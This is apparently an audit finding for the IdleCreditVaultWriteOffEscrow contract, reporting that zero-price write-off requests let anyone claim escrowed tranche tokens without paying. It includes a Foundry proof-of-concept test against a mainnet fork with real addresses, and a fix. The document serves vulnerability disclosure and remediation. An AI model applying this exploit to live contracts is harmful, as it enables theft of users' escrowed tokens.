### Title
Unvalidated zero-price write-off requests allow theft of escrowed tranche tokens - (File: `contracts/IdleCreditVaultWriteOffEscrow.sol`)

### Summary
`createWriteOffRequest` accepts `underlyingsRequested == 0`, while `fullfillWriteOffRequest` permits any wallet to satisfy that request without paying underlying tokens and receive all escrowed tranche tokens.

### Finding Description
A lender can escrow tranche tokens by calling `createWriteOffRequest`, which only rejects a zero tranche amount and performs no validation on `underlyingsRequested`. [1](#0-0) 

Any caller can then fulfill the request because the function is intentionally permissionless. [2](#0-1) 

For a request with `underlyings == 0`, passing `_underlyings == 0` satisfies the `_underlyings < currentRequest.underlyings` check. [3](#0-2) 

The fulfiller therefore performs a zero-value `transferFrom`, pays no fee, transfers zero underlying to the seller, and receives the seller's escrowed tranche tokens. [4](#0-3) 

### Impact Explanation
An unprivileged fulfiller can permanently acquire all tranche tokens escrowed under a zero-priced request without transferring underlying consideration.

For a request containing `N` tranche tokens, the attacker receives `N` tokens and the seller receives `0` underlying, less only a fee calculated on the zero payment and therefore also zero. The broken invariant is fair exchange of escrowed tranche tokens for the requested underlying consideration.

### Likelihood Explanation
The attack requires a user to create a malformed request with `underlyingsRequested == 0`, but the contract does not prevent this input and any EOA can immediately fulfill it. Because fulfillment is permissionless, a zero-priced request can be captured by a public mempool observer or automated bot before the seller corrects it.

### Recommendation
Reject `underlyingsRequested == 0` in `createWriteOffRequest`. If write-offs must remain economically sound, additionally compare the requested amount against the current tranche value or require an explicit owner-approved minimum-price configuration rather than allowing arbitrary zero-value asks.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVaultWriteOffEscrow} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract ZeroPriceWriteOffEscrowPoC is Test {
    IdleCDOEpochVariant constant CDO =
        IdleCDOEpochVariant(0xf6223C567F21E33e859ED7A045773526E9E3c2D5);
    address constant LP = 0xA7780086ab732C110E9E71950B9Fb3cb2ea50D89;
    address constant OWNER = 0xFb3bD022D5DAcF95eE28a6B07825D4Ff9C5b3814;

    function testZeroPriceRequestStealsEscrowedTranches() external {
        vm.createSelectFork("mainnet", 23032567);

        IdleCreditVaultWriteOffEscrow escrow =
            new IdleCreditVaultWriteOffEscrow();
        vm.store(address(escrow), bytes32(uint256(0)), bytes32(uint256(0)));
        escrow.initialize(address(CDO), OWNER, true);

        IERC20Detailed tranche = IERC20Detailed(CDO.AATranche());
        IERC20Detailed underlying = IERC20Detailed(CDO.token());
        uint256 amount = 1_000e18;
        address attacker = makeAddr("attacker");

        vm.startPrank(LP);
        tranche.approve(address(escrow), amount);
        escrow.createWriteOffRequest(amount, 0);
        vm.stopPrank();

        uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);

        vm.prank(attacker);
        escrow.fullfillWriteOffRequest(LP, amount, 0);

        assertEq(tranche.balanceOf(attacker), amount);
        assertEq(underlying.balanceOf(attacker), attackerUnderlyingBefore);
        assertEq(underlying.balanceOf(LP), 0);

        (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);
        assertEq(tranches, 0);
        assertEq(underlyings, 0);
    }
}
```

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request

      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
```
